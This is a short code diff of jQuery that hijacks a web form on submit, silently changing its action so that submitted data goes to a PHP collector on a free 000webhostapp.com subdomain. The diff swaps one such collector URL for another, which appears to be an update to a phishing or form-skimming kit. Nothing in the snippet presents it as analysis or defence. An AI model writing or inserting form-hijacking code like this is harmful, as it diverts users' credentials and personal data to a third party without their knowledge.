@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://give-hepeng-godang.000webhostapp.com/jozz/wo.php");
+  $(myform).attr("action", "https://sakikpalo-awakdah.000webhostapp.com/jozzz/xo.php");
 });
